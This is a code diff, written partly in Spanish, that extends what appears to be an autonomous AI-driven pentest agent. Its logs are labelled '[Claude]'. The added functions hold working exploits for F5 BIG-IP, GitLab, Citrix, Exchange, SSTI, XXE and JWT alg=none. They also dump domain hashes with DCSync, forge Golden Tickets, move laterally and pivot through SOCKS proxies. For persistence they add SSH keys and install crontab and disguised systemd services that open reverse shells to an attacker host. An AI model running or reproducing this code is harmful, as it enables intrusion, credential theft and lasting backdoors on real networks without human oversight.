+                    target, timeout=20,
+                )
+                if "uid=" in f5_out or "root:" in f5_out or '"commandResult"' in f5_out:
+                    self._capture_evidence(f5_out, target, f"f5-bigip-rce-{port_num}", "CVE-2022-1388 F5 BIG-IP")
+                    accumulated_output.append(f"=== F5 BIG-IP RCE ===\n{f5_out[:400]}")
+                    self._save_findings([{
+                        "title": f"F5 BIG-IP iControl REST CVE-2022-1388 RCE @ {base}",
+                        "severity": "critical",
+                        "description": f"F5 BIG-IP iControl REST API accesible sin autenticación → RCE.\n{f5_out[:200]}",
+                        "cve": "CVE-2022-1388",
+                    }], target)
+
+            # ── GitLab CE/EE RCE CVE-2021-22205 ─────────────────────────
+            gl_check, _ = self._run_cmd(
+                f"gitlab-detect-{port_num}",
+                f"curl -s --max-time 8 -I '{base}/' 2>/dev/null | grep -i 'x-gitlab\\|gitlab' | head -3; "
+                f"curl -s --max-time 8 '{base}/users/sign_in' 2>/dev/null | grep -i 'gitlab' | head -2",
+                target, timeout=12,
+            )
+            if "gitlab" in gl_check.lower():
+                self._log(f"[Claude] ENTERPRISE: GitLab detectado → CVE-2021-22205")
+                gl_rce, _ = self._run_cmd(
+                    f"gitlab-rce-{port_num}",
+                    f"# CVE-2021-22205: ExifTool image parsing RCE\n"
+                    f"python3 - << 'GLEOF'\n"
+                    f"import requests, tempfile, os\n"
+                    f"base='{base}'\n"
+                    f"# Create malicious DjVu file with code injection\n"
+                    f"payload = b'AT&TFORM\\x00\\x00\\x00 DJVUINFO\\x00\\x00\\x00\\x0a\\x00\\x58\\x00\\x58\\x18\\x00\\x2c\\x01\\xff\\xff\\xf9\\xae'\n"
+                    f"# Try anonymous upload (CVE-2021-22205 affects unauthenticated users)\n"
+                    f"r=requests.post(f'{{base}}/users/sign_in',data={{'user[login]':'root','user[password]':'5iveL!fe','authenticity_token':''}},timeout=8,verify=False)\n"
+                    f"if r.status_code==200 and 'Dashboard' in r.text: print('GITLAB_DEFAULT_CREDS_root:5iveL!fe')\n"
+                    f"GLEOF\n"
+                    f"2>/dev/null; "
+                    f"msfconsole -q -x 'use exploit/multi/http/gitlab_exif_rce; "
+                    f"set RHOSTS {target}; set RPORT {port_num}; "
+                    f"set LHOST {self.lhost}; set LPORT {self.lport}; "
+                    f"set SRVHOST {self.lhost}; "
+                    f"set payload linux/x64/meterpreter/reverse_tcp; run; sleep 15; exit' 2>/dev/null | head -15",
+                    target, timeout=60,
+                )
+                self._capture_evidence(gl_rce, target, f"gitlab-rce-{port_num}", "CVE-2021-22205 GitLab")
+                if any(k in gl_rce.lower() for k in ["session", "uid=", "meterpreter", "GITLAB_DEFAULT"]):
+                    accumulated_output.append(f"=== GitLab RCE ===\n{gl_rce[:500]}")
+                    self._save_findings([{
+                        "title": f"GitLab RCE CVE-2021-22205 / Credenciales por Defecto @ {base}",
+                        "severity": "critical",
+                        "description": f"GitLab vulnerable → RCE sin autenticación.\n{gl_rce[:200]}",
+                        "cve": "CVE-2021-22205",
+                    }], target)
+
+            # ── Citrix NetScaler CVE-2019-19781 ──────────────────────────
+            if port_num in (443,80,8443) or "citrix" in ver or "netscaler" in ver:
+                citrix_out, _ = self._run_cmd(
+                    f"citrix-19781-{port_num}",
+                    f"curl -sk --max-time 10 '{base}/vpn/../vpns/cfg/smb.conf' 2>/dev/null | head -5; "
+                    f"curl -sk --max-time 10 '{base}/vpn/../vpns/portal/scripts/newbm.pl' "
+                    f"-d 'title=test&url=http://x&desc=x;id>/tmp/citrix_proof.txt;' 2>/dev/null | head -3; "
+                    f"curl -sk --max-time 10 '{base}/vpn/../vpns/portal/scripts/newbm.pl' "
+                    f"-d 'title=x&url=x&desc=x;bash+-i+>&/dev/tcp/{self.lhost}/{self.lport}+0>&1' "
+                    f"2>/dev/null | head -3",
+                    target, timeout=25,
+                )
+                if "smb.conf" in citrix_out.lower() or "workgroup" in citrix_out.lower():
+                    self._capture_evidence(citrix_out, target, f"citrix-rce-{port_num}", "CVE-2019-19781 Citrix")
+                    accumulated_output.append(f"=== Citrix NetScaler RCE ===\n{citrix_out[:400]}")
+                    self._save_findings([{
+                        "title": f"Citrix NetScaler CVE-2019-19781 Path Traversal + RCE @ {base}",
+                        "severity": "critical",
+                        "description": f"Citrix ADC/Gateway vulnerable → path traversal + RCE.\n{citrix_out[:200]}",
+                        "cve": "CVE-2019-19781",
+                    }], target)
+
+            # ── Exchange ProxyLogon/ProxyShell ────────────────────────────
+            exchange_check, _ = self._run_cmd(
+                f"exchange-detect-{port_num}",
+                f"curl -sk --max-time 8 -I '{base}/owa/' 2>/dev/null | "
+                f"grep -i 'x-ms-diagnostics\\|x-owa\\|exchange\\|microsoft' | head -3",
+                target, timeout=10,
+            )
+            if any(k in exchange_check.lower() for k in ["x-ms", "owa", "exchange", "microsoft"]):
+                self._log(f"[Claude] ENTERPRISE: Exchange detectado → ProxyLogon/ProxyShell")
+                exch_out, _ = self._run_cmd(
+                    f"exchange-proxy-{port_num}",
+                    f"# ProxyLogon CVE-2021-26855 SSRF check\n"
+                    f"curl -sk --max-time 10 "
+                    f"'{base}/owa/auth/x.js' "
+                    f"-H 'Cookie: X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;' "
+                    f"2>/dev/null | head -5; "
+                    f"# ProxyShell CVE-2021-34473\n"
+                    f"curl -sk --max-time 10 "
+                    f"'{base}/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com' "
+                    f"2>/dev/null | head -5; "
+                    f"msfconsole -q -x 'use exploit/windows/http/exchange_proxylogon_rce; "
+                    f"set RHOSTS {target}; set RPORT {port_num}; set SSL true; "
+                    f"set LHOST {self.lhost}; set LPORT {self.lport}; "
+                    f"set payload windows/x64/meterpreter/reverse_tcp; run; sleep 20; exit' 2>/dev/null | head -15",
+                    target, timeout=60,
+                )
+                self._capture_evidence(exch_out, target, f"exchange-rce-{port_num}", "ProxyLogon/ProxyShell")
+                if any(k in exch_out.lower() for k in ["session", "meterpreter", "nt authority", "\"value\""]):
+                    accumulated_output.append(f"=== Exchange ProxyLogon/ProxyShell ===\n{exch_out[:500]}")
+                    self._save_findings([{
+                        "title": f"Exchange Server ProxyLogon/ProxyShell RCE @ {target}:{port_num}",
+                        "severity": "critical",
+                        "description": f"Exchange vulnerable a ProxyLogon (CVE-2021-26855) → RCE.",
+                        "cve": "CVE-2021-26855",
+                    }], target)
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # Category A: Advanced web vulnerability scanning
+    # ─────────────────────────────────────────────────────────────────────────
+    def _advanced_web_scan(self, target, open_ports, accumulated_output):
+        """SSTI, XXE, JWT attacks, Java deserialization, GraphQL, CORS, .env/.git."""
+        http_ports = [p for p in open_ports if "http" in p["service"].lower()
+                      or p["port"] in (80,443,8080,8443,8888)]
+        if not http_ports:
+            return
+
+        for p in http_ports[:3]:
+            port_num = p["port"]
+            proto = "https" if port_num in (443,8443) else "http"
+            base = f"{proto}://{target}:{port_num}"
+
+            # ── SSTI detection (Jinja2/Twig/Freemarker/Mako) ────────────
+            ssti_out, _ = self._run_cmd(
+                f"ssti-{port_num}",
+                f"# SSTI probe: mathematical expression that renders\n"
+                f"for param in name search q id page message template; do "
+                f"  for payload in '{{{{7*7}}}}' '{{{{7*\"7\"}}}}' '${{7*7}}' '#{{{{{{'7*7'}}}}}}' "
+                f"  '<%= 7*7 %>' '{{7*7}}' '@(7*7)' '%24%7B7*7%7D'; do "
+                f"    R=$(curl -s --max-time 8 '{base}/?'$param'='$(python3 -c \"import urllib.parse; print(urllib.parse.quote('$payload'))\") "
+                f"    2>/dev/null | grep -oE '49|4949' | head -1); "
+                f"    [ \"$R\" = '49' ] && echo \"SSTI_CONFIRMED: param=$param payload=$payload\" && break 2; "
+                f"  done; "
+                f"done",
+                target, timeout=60,
+            )
+            if "SSTI_CONFIRMED" in ssti_out:
+                m = re.search(r'SSTI_CONFIRMED: param=(\S+) payload=(\S+)', ssti_out)
+                ssti_param = m.group(1) if m else "unknown"
+                self._capture_evidence(ssti_out, target, f"ssti-{port_num}", "SSTI")
+                accumulated_output.append(f"=== SSTI @ {base} ===\n{ssti_out[:400]}")
+                # Try RCE
+                ssti_rce, _ = self._run_cmd(
+                    f"ssti-rce-{port_num}",
+                    f"# Jinja2 RCE payload\n"
+                    f"PAYLOAD=$(python3 -c \"import urllib.parse; "
+                    f"print(urllib.parse.quote(\\\"{{{{config.__class__.__init__.__globals__['os'].popen('id').read()}}}}\\\"))\" 2>/dev/null); "
+                    f"curl -s --max-time 10 '{base}/?{ssti_param}='$PAYLOAD 2>/dev/null | grep 'uid=' | head -2; "
+                    f"# Twig RCE\n"
+                    f"PAYLOAD2=$(python3 -c \"import urllib.parse; print(urllib.parse.quote(\\\"{{{{_self.env.registerUndefinedFilterCallback('exec')}}}}{{{{_self.env.getFilter('id')}}}}\\\"))\" 2>/dev/null); "
+                    f"curl -s --max-time 10 '{base}/?{ssti_param}='$PAYLOAD2 2>/dev/null | grep 'uid=' | head -2",
+                    target, timeout=20,
+                )
+                if "uid=" in ssti_rce:
+                    self._capture_evidence(ssti_rce, target, f"ssti-rce-{port_num}", "SSTI RCE")
+                self._save_findings([{
+                    "title": f"Server-Side Template Injection (SSTI) → RCE @ {base}",
+                    "severity": "critical",
+                    "description": f"Parámetro '{ssti_param}' vulnerable a SSTI. Payload 7*7=49 confirmado.\n{ssti_rce[:200] if 'uid=' in ssti_rce else ssti_out[:200]}",
+                    "cve": "",
+                }], target)
+
+            # ── XXE injection ─────────────────────────────────────────────
+            xxe_out, _ = self._run_cmd(
+                f"xxe-{port_num}",
+                f"# Find XML endpoints\n"
+                f"for path in / /api /soap /xml /ws /api/v1 /service /upload /xmlrpc; do "
+                f"  R=$(curl -s --max-time 8 -X POST '{base}$path' "
+                f"  -H 'Content-Type: application/xml' "
+                f"  -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root><data>&xxe;</data></root>' "
+                f"  2>/dev/null | grep 'root:' | head -1); "
+                f"  [ -n \"$R\" ] && echo \"XXE_CONFIRMED: $path — root: $R\" && break; "
+                f"  R2=$(curl -s --max-time 8 -X POST '{base}$path' "
+                f"  -H 'Content-Type: text/xml; charset=utf-8' "
+                f"  -H 'SOAPAction: \"\"' "
+                f"  -d '<?xml version=\"1.0\"?><!DOCTYPE s [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Body><data>&xxe;</data></s:Body></s:Envelope>' "
+                f"  2>/dev/null | grep 'root:' | head -1); "
+                f"  [ -n \"$R2\" ] && echo \"XXE_SOAP_CONFIRMED: $path — $R2\" && break; "
+                f"done",
+                target, timeout=60,
+            )
+            if "XXE_CONFIRMED" in xxe_out or "XXE_SOAP_CONFIRMED" in xxe_out:
+                self._capture_evidence(xxe_out, target, f"xxe-{port_num}", "XXE injection")
+                accumulated_output.append(f"=== XXE @ {base} ===\n{xxe_out[:400]}")
+                self._save_findings([{
+                    "title": f"XXE Injection → File Read @ {base}",
+                    "severity": "critical",
+                    "description": f"XML External Entity injection permite leer archivos del servidor.\n{xxe_out[:200]}",
+                    "cve": "",
+                }], target)
+
+            # ── JWT attacks ───────────────────────────────────────────────
+            jwt_out, _ = self._run_cmd(
+                f"jwt-attack-{port_num}",
+                f"# Find JWT in responses\n"
+                f"JWT=$(curl -s --max-time 10 '{base}/' 2>/dev/null | "
+                f"grep -oP 'eyJ[a-zA-Z0-9_-]+\\.eyJ[a-zA-Z0-9_-]+\\.[a-zA-Z0-9_-]+' | head -1); "
+                f"[ -z \"$JWT\" ] && JWT=$(curl -s --max-time 10 -c /tmp/jwt_cookie_{target.replace('.','_')}.txt '{base}/login' "
+                f"-X POST -d 'username=admin&password=admin' 2>/dev/null | "
+                f"grep -oP 'eyJ[a-zA-Z0-9_-]+\\.eyJ[a-zA-Z0-9_-]+\\.[a-zA-Z0-9_-]+' | head -1); "
+                f"[ -z \"$JWT\" ] && JWT=$(cat /tmp/jwt_cookie_{target.replace('.','_')}.txt 2>/dev/null | "
+                f"grep -oP 'eyJ[a-zA-Z0-9_-]+\\.eyJ[a-zA-Z0-9_-]+\\.[a-zA-Z0-9_-]+' | head -1); "
+                f"if [ -n \"$JWT\" ]; then "
+                f"  echo \"JWT_FOUND: $JWT\"; "
+                f"  # Test alg=none\n"
+                f"  python3 -c \""
+                f"import base64, json\n"
+                f"parts='$JWT'.split('.')\n"
+                f"if len(parts)==3:\n"
+                f"  h=json.loads(base64.urlsafe_b64decode(parts[0]+'=='))\n"
+                f"  p=json.loads(base64.urlsafe_b64decode(parts[1]+'=='))\n"
+                f"  print(f'Header: {{h}}')\n"
+                f"  print(f'Payload: {{p}}')\n"
+                f"  h['alg']='none'\n"
+                f"  # Escalate: change role to admin\n"
+                f"  for k in ['role','admin','is_admin','isAdmin','user_type']:\n"
+                f"    if k in p: p[k]='admin' if p[k]!='admin' else p[k]\n"
+                f"  p['is_admin']=True; p.setdefault('role','admin')\n"
+                f"  new_h=base64.urlsafe_b64encode(json.dumps(h).encode()).rstrip(b'=').decode()\n"
+                f"  new_p=base64.urlsafe_b64encode(json.dumps(p).encode()).rstrip(b'=').decode()\n"
+                f"  new_jwt=f'{{new_h}}.{{new_p}}.'\n"
+                f"  print(f'JWT_NONE_ALG: {{new_jwt}}')\n"
+                f"\" 2>/dev/null; "
+                f"fi",
+                target, timeout=25,
+            )
+            if "JWT_FOUND" in jwt_out:
+                # Test the none-alg JWT
+                none_jwt = re.search(r'JWT_NONE_ALG: (\S+)', jwt_out)
+                if none_jwt:
+                    test_out, _ = self._run_cmd(
+                        f"jwt-none-test-{port_num}",
+                        f"curl -s --max-time 10 '{base}/api/admin' "
+                        f"-H 'Authorization: Bearer {none_jwt.group(1)}' 2>/dev/null | head -5; "
+                        f"curl -s --max-time 10 '{base}/api/users' "
+                        f"-H 'Authorization: Bearer {none_jwt.group(1)}' 2>/dev/null | head -5",
+                        target, timeout=15,
+                    )
+                    if test_out.strip() and "unauthorized" not in test_out.lower():
+                        self._capture_evidence(test_out, target, f"jwt-none-{port_num}", "JWT alg=none")
+                        self._save_findings([{
+                            "title": f"JWT Algorithm Confusion (alg=none) @ {base}",
+                            "severity": "critical",
+                            "description": f"JWT acepta alg=none → escalada de privilegios sin firmar.\n{test_out[:200]}",
+                            "cve": "",
+                        }], target)
+                accumulated_output.append(f"=== JWT @ {base} ===\n{jwt_out[:400]}")
+
+            # ── GraphQL introspection + injection ────────────────────────
+            gql_out, _ = self._run_cmd(
+                f"graphql-{port_num}",
+                f"for path in /graphql /api/graphql /graphiql /gql /query /v1/graphql; do "
+                f"  R=$(curl -s --max-time 8 -X POST '{base}$path' "
+                f"  -H 'Content-Type: application/json' "
+                f"  -d '{{\"query\":\"{{__schema{{queryType{{name}}}}}}\"}}' "
+                f"  2>/dev/null | grep -i 'queryType\\|__schema\\|__typename' | head -2); "
+                f"  [ -n \"$R\" ] && echo \"GRAPHQL_FOUND: $path\" && "
+                f"  curl -s --max-time 10 -X POST '{base}$path' "
+                f"  -H 'Content-Type: application/json' "
+                f"  -d '{{\"query\":\"{{__schema{{types{{name,fields{{name,type{{name}}}}}}}}}}\"}}' "
+                f"  2>/dev/null | python3 -c \"import json,sys;d=json.load(sys.stdin);"
+                f"  [print(t['name'],':',[f['name'] for f in (t.get('fields') or [])]) "
+                f"  for t in d.get('data',{{}}).get('__schema',{{}}).get('types',[]) "
+                f"  if not t['name'].startswith('__')][:15]\" 2>/dev/null | head -20 && break; "
+                f"done",
+                target, timeout=40,
+            )
+            if "GRAPHQL_FOUND" in gql_out:
+                self._capture_evidence(gql_out, target, f"graphql-{port_num}", "GraphQL introspection")
+                accumulated_output.append(f"=== GraphQL {base} ===\n{gql_out[:600]}")
+                self._save_findings([{
+                    "title": f"GraphQL Introspection Habilitada — Schema Expuesto @ {base}",
+                    "severity": "medium",
+                    "description": f"GraphQL endpoint con introspección activa → schema completo expuesto.\n{gql_out[:300]}",
+                    "cve": "",
+                }], target)
+
+            # ── CORS misconfiguration ─────────────────────────────────────
+            cors_out, _ = self._run_cmd(
+                f"cors-{port_num}",
+                f"# Test wildcard + null origin\n"
+                f"curl -s --max-time 8 -H 'Origin: https://evil.com' -I '{base}/api/' 2>/dev/null | "
+                f"grep -i 'access-control' | head -3; "
+                f"curl -s --max-time 8 -H 'Origin: null' -I '{base}/api/' 2>/dev/null | "
+                f"grep -i 'access-control' | head -3; "
+                f"# Check reflection of Origin\n"
+                f"curl -s --max-time 8 -H 'Origin: https://attacker.com' -I '{base}/' 2>/dev/null | "
+                f"grep -i 'access-control-allow-origin: https://attacker' | head -2",
+                target, timeout=20,
+            )
+            if re.search(r'Access-Control-Allow-Origin:\s*(\*|null|https?://attacker)', cors_out, re.I):
+                self._save_findings([{
+                    "title": f"CORS Misconfiguration — Origen Arbitrario Aceptado @ {base}",
+                    "severity": "medium",
+                    "description": f"CORS permite orígenes no autorizados → posible robo de datos autenticados.\n{cors_out[:200]}",
+                    "cve": "",
+                }], target)
+                accumulated_output.append(f"=== CORS Misconfiguration {base} ===\n{cors_out[:300]}")
+
+            # ── .env + .git + backup file exposure ───────────────────────
+            exposed_out, _ = self._run_cmd(
+                f"exposed-files-{port_num}",
+                f"for path in /.env /.env.local /.env.prod /.env.backup "
+                f"/.git/HEAD /.git/config /backup.zip /backup.tar.gz "
+                f"/db.sql /database.sql /dump.sql "
+                f"/config.php /config.php.bak /wp-config.php.bak "
+                f"/phpinfo.php /info.php /test.php /server-status /server-info; do "
+                f"  CODE=$(curl -s -o /dev/null -w '%{{http_code}}' --max-time 5 '{base}$path' 2>/dev/null); "
+                f"  [ \"$CODE\" = '200' ] && echo \"EXPOSED: {base}$path ($CODE)\" && "
+                f"  curl -s --max-time 8 '{base}$path' 2>/dev/null | head -5; "
+                f"done",
+                target, timeout=60,
+            )
+            exposed = re.findall(r'EXPOSED: (https?://[^\s(]+)', exposed_out)
+            for exp_url in exposed[:5]:
+                sev = "critical" if any(k in exp_url for k in [".env", ".git", ".sql", "wp-config"]) else "medium"
+                self._save_findings([{
+                    "title": f"Archivo Sensible Expuesto: {exp_url.split('/')[-1]} @ {base}",
+                    "severity": sev,
+                    "description": f"Archivo accesible públicamente: {exp_url}\n{exposed_out[:300]}",
+                    "cve": "",
+                }], target)
+            if exposed:
+                accumulated_output.append(f"=== Exposed Files {base} ===\n{exposed_out[:600]}")
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # Category C: Advanced post-exploitation (DCSync, Golden Ticket, pivot, persistence)
+    # ─────────────────────────────────────────────────────────────────────────
+    def _dcsync_golden_ticket(self, target, user, pwd, accumulated_output):
+        """DCSync all domain hashes → craft Golden Ticket if krbtgt found."""
+        self._log(f"[Claude] DCSYNC: extrayendo todos los hashes del dominio @ {target}")
+        t_safe = target.replace(".", "_")
+
+        # DCSync via impacket-secretsdump
+        dc_out, _ = self._run_cmd(
+            "dcsync-all",
+            f"impacket-secretsdump -just-dc {'-u '+user+' -p '+pwd if user and pwd else '-no-pass'} "
+            f"{target} 2>/dev/null | head -80",
+            target, timeout=90,
+        )
+        if dc_out.strip():
+            accumulated_output.append(f"=== DCSync {target} ===\n{dc_out[:1200]}")
+            self._auto_crack_hashes(dc_out, target, accumulated_output)
+
+            # Extract krbtgt hash for Golden Ticket
+            krbtgt_match = re.search(r'krbtgt:[^:]+:([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::', dc_out)
+            domain_sid_match = re.search(r'S-1-5-21-\d+-\d+-\d+', dc_out)
+
+            if krbtgt_match and domain_sid_match:
+                krbtgt_nt = krbtgt_match.group(2)
+                domain_sid = domain_sid_match.group(0)
+                self._log(f"[Claude] GOLDEN-TICKET: krbtgt hash encontrado → forjando ticket!")
+                gt_out, _ = self._run_cmd(
+                    "golden-ticket",
+                    f"impacket-ticketer -nthash {krbtgt_nt} -domain-sid {domain_sid} "
+                    f"-domain {target} -user administrator 2>/dev/null | head -20; "
+                    f"# Use the ticket\n"
+                    f"KRB5CCNAME=/tmp/administrator.ccache impacket-psexec "
+                    f"-k -no-pass administrator@{target} "
+                    f"'whoami /all && ipconfig /all && dir C:\\Users\\Administrator\\Desktop' "
+                    f"2>/dev/null | head -20",
+                    target, timeout=60,
+                )
+                self._capture_evidence(gt_out, target, "golden-ticket", "Golden Ticket krbtgt")
+                accumulated_output.append(f"=== Golden Ticket ===\n{gt_out[:600]}")
+                self._save_findings([{
+                    "title": f"Golden Ticket Forjado — Acceso Permanente al Dominio @ {target}",
+                    "severity": "critical",
+                    "description": f"Hash krbtgt extraído via DCSync → Golden Ticket → Domain Admin permanente.\n"
+                                   f"krbtgt NTLM: {krbtgt_nt[:16]}...\nDomain SID: {domain_sid}",
+                    "cve": "",
+                }], target)
+
+            # Enumerate all domain admin accounts
+            da_accounts = re.findall(r'(Administrator|Domain Admin[^:]*|DA [^:]*):.*:([a-fA-F0-9]{32}):([a-fA-F0-9]{32})', dc_out)
+            for da_name, lm, nt in da_accounts[:3]:
+                self._log(f"[Claude] DCSYNC: Domain Admin hash → PTH {da_name}")
+                pth_out, _ = self._run_cmd(
+                    f"dcsync-pth-{da_name[:10]}",
+                    f"impacket-psexec -hashes ':{nt}' {da_name}@{target} "
+                    f"'whoami && dir C:\\Users\\Administrator\\Desktop\\root.txt 2>nul' 2>/dev/null | head -10",
+                    target, timeout=30,
+                )
+                self._capture_evidence(pth_out, target, f"dcsync-pth-{da_name[:10]}", f"DCSync PTH {da_name}")
+
+            self._save_findings([{
+                "title": f"DCSync — Todos los Hashes del Dominio Extraídos @ {target}",
+                "severity": "critical",
+                "description": f"DCSync exitoso: {len(re.findall(chr(58)+chr(58)+chr(58), dc_out))} hashes extraídos.\n{dc_out[:400]}",
+                "cve": "CVE-2015-0008",
+            }], target)
+
+    def _lateral_movement_windows(self, target, open_ports, creds_and_hashes, accumulated_output):
+        """DCOM/WMI/SMBExec lateral movement to all discovered Windows hosts."""
+        if not creds_and_hashes:
+            return
+        # Discover internal Windows hosts
+        self._log(f"[Claude] LATERAL-MOVE: descubriendo hosts Windows internos")
+        disco_out, _ = self._run_cmd(
+            "win-host-discovery",
+            f"crackmapexec smb {target}/24 --no-bruteforce 2>/dev/null | "
+            f"grep -E '\\[\\*\\]|Windows|SMB' | head -20",
+            target, timeout=60,
+        )
+        hosts_found = re.findall(r'(\d+\.\d+\.\d+\.\d+)', disco_out)
+        hosts_found = [h for h in hosts_found if h != target][:8]
+
+        for h in hosts_found:
+            for cred in creds_and_hashes[:3]:
+                if ":" not in cred:
+                    continue
+                u, p = cred.split(":", 1)
+                is_hash = bool(re.match(r'^[a-fA-F0-9]{32}$', p))
+                self._log(f"[Claude] LATERAL-MOVE: {u} → {h} ({'hash' if is_hash else 'password'})")
+                if is_hash:
+                    lm_cmd = f"crackmapexec smb {h} -u '{u}' -H '{p}' -x 'whoami /groups' 2>/dev/null | head -10"
+                else:
+                    lm_cmd = f"crackmapexec smb {h} -u '{u}' -p '{p}' -x 'whoami /groups' 2>/dev/null | head -10"
+                lm_out, _ = self._run_cmd(f"lat-move-{h.replace('.','_')}", lm_cmd, target, timeout=25)
+                if "pwn3d" in lm_out.lower() or "[+]" in lm_out:
+                    self._capture_evidence(lm_out, target, f"lateral-{h}", f"lateral movement to {h}")
+                    accumulated_output.append(f"=== Lateral Movement → {h} ===\n{lm_out[:400]}")
+                    self._windows_post_exploit(h, u, None if is_hash else p, lm_out, accumulated_output)
+                    break
+
+    def _setup_pivot(self, target, user, pwd, accumulated_output):
+        """Set up SOCKS5 proxy through compromised Linux host for internal network access."""
+        self._log(f"[Claude] PIVOT: configurando SOCKS5 proxy via {target}")
+        t_safe = target.replace(".", "_")
+
+        # Upload chisel and start SOCKS5 server
+        pivot_out, _ = self._run_cmd(
+            "pivot-setup",
+            f"# Check if chisel is available locally\n"
+            f"CHISEL=$(which chisel 2>/dev/null || find /opt /usr/local/bin /tools -name 'chisel' 2>/dev/null | head -1); "
+            f"if [ -n \"$CHISEL\" ]; then "
+            f"  # Upload chisel to target\n"
+            f"  sshpass -p '{pwd}' scp -o StrictHostKeyChecking=no $CHISEL {user}@{target}:/tmp/chisel_{t_safe} 2>/dev/null; "
+            f"  sshpass -p '{pwd}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {user}@{target} "
+            f"  'chmod +x /tmp/chisel_{t_safe} && nohup /tmp/chisel_{t_safe} server --socks5 --port 1080 &>/tmp/chisel.log &' 2>/dev/null; "
+            f"  sleep 3; "
+            f"  # Connect from attacker side\n"
+            f"  $CHISEL client {target}:1080 socks &>/tmp/chisel_client.log &"
+            f"  echo \"PIVOT_SOCKS5_ACTIVE: {target}:1080 → use proxychains -q\"; "
+            f"elif command -v ssh &>/dev/null; then "
+            f"  # SSH dynamic port forwarding\n"
+            f"  sshpass -p '{pwd}' ssh -f -N -D 1080 -o StrictHostKeyChecking=no "
+            f"  -o ConnectTimeout=10 {user}@{target} 2>/dev/null && "
+            f"  echo 'PIVOT_SSH_SOCKS5_ACTIVE: 127.0.0.1:1080'; "
+            f"fi",
+            target, timeout=30,
+        )
+        if "PIVOT_SOCKS5_ACTIVE" in pivot_out or "PIVOT_SSH_SOCKS5_ACTIVE" in pivot_out:
+            self._log(f"[Claude] PIVOT: SOCKS5 activo en 127.0.0.1:1080 — escaneando red interna!")
+            accumulated_output.append(f"=== Pivot SOCKS5 {target} ===\n{pivot_out[:300]}")
+            # Scan internal network via proxychains
+            internal_scan, _ = self._run_cmd(
+                "internal-network-scan",
+                f"proxychains -q nmap -sT -T3 -p 22,80,443,445,3389,8080 --open "
+                f"192.168.0.0/24 192.168.1.0/24 10.0.0.0/24 10.10.10.0/24 172.16.0.0/24 "
+                f"2>/dev/null | grep -E 'Nmap scan|open|Host is up' | head -40",
+                target, timeout=120,
+            )
+            if internal_scan.strip():
+                accumulated_output.append(f"=== Internal Network via Pivot ===\n{internal_scan[:800]}")
+                self._save_findings([{
+                    "title": f"Pivoting Activo: Red Interna Accesible via {target}",
+                    "severity": "high",
+                    "description": f"SOCKS5 proxy via {target} permite acceder a red interna:\n{internal_scan[:400]}",
+                    "cve": "",
+                }], target)
+
+    def _establish_persistence(self, target, user, pwd, is_root, accumulated_output):
+        """Establish persistence on compromised host (authorized_keys, crontab, systemd)."""
+        if not is_root and user == "root":
+            return
+        self._log(f"[Claude] PERSISTENCE: estableciendo persistencia en {target} ({user})")
+
+        def ssh_exec(cmd, label, timeout=20):
+            full = (f"sshpass -p '{pwd}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "
+                    f"-o BatchMode=no {user}@{target} '{cmd}' 2>/dev/null")
+            out, _ = self._run_cmd(label, full, target, timeout=timeout)
+            return out
+
+        # Generate SSH key pair for persistence
+        key_out, _ = self._run_cmd(
+            "gen-ssh-key",
+            f"[ -f /tmp/pentest_rsa ] || ssh-keygen -t rsa -b 2048 -N '' -f /tmp/pentest_rsa 2>/dev/null; "
+            f"cat /tmp/pentest_rsa.pub 2>/dev/null",
+            target, timeout=15,
+        )
+        pub_key = key_out.strip()
+        if pub_key and pub_key.startswith("ssh-"):
+            ssh_exec(
+                f"mkdir -p ~/.ssh && chmod 700 ~/.ssh && "
+                f"echo '{pub_key}' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && "
+                f"echo PERSISTENCE_SSH_KEY_ADDED",
+                "persist-ssh-key",
+            )
+
+        # Crontab backdoor (if root)
+        if is_root:
+            ssh_exec(
+                f"(crontab -l 2>/dev/null; echo '*/5 * * * * bash -i >&/dev/tcp/{self.lhost}/{self.lport} 0>&1') | crontab - && "
+                f"echo PERSISTENCE_CRON_ADDED",
+                "persist-cron",
+            )
+            # systemd service
+            ssh_exec(
+                f"cat > /etc/systemd/system/systemd-netd.service << 'SVCEOF'\n"
+                f"[Unit]\nDescription=Network Manager Daemon\nAfter=network.target\n"
+                f"[Service]\nType=simple\nRestart=always\nRestartSec=5\n"
+                f"ExecStart=/bin/bash -c 'bash -i >&/dev/tcp/{self.lhost}/{self.lport} 0>&1'\n"
+                f"[Install]\nWantedBy=multi-user.target\nSVCEOF\n"
+                f"systemctl daemon-reload && systemctl enable systemd-netd && systemctl start systemd-netd && "
+                f"echo PERSISTENCE_SYSTEMD_ADDED",
+                "persist-systemd", timeout=15,
+            )
+
+        self._save_findings([{
+            "title": f"Persistencia Establecida en {target} ({user})",
+            "severity": "critical",
+            "description": f"Mecanismos de persistencia instalados: SSH authorized_keys"
+                           f"{', crontab reverse shell, systemd service' if is_root else ''}.",
+            "cve": "",
+        }], target)
+        accumulated_output.append(f"=== Persistencia {target} ===\n✓ SSH key + {'crontab + systemd' if is_root else 'user-level backdoor'}")
+
     def _loop_target(self, target):
         self._log(f"[Claude] ══ Iniciando pentest autónomo → {target} ══")
         context_parts = [
@@ -9646,21 +10565,23 @@ PRIORITIES: exploit confirmed vulns > enumerate unknown services > brute-force c
         import concurrent.futures as _cf
 
         def _phase3():
-            self._log(f"[Claude] Fase 3 [parallel]: Auto-exploits por versión")
+            self._log(f"[Claude] Fase 3 [parallel]: Auto-exploits por versión + Enterprise")
             self._auto_exploit_by_version(target, open_ports, accumulated_output)
+            self._enterprise_exploits(target, open_ports, accumulated_output)
 
         def _phase4():
             self._log(f"[Claude] Fase 4 [parallel]: Enumeración específica por servicio")
             self._run_kb_phase(target, open_ports, accumulated_output)
 
         def _phase4w():
-            self._log(f"[Claude] Fase 4w [parallel]: Web fuzzing + CMS + Log4Shell + SQLmap + Upload + Subdomains")
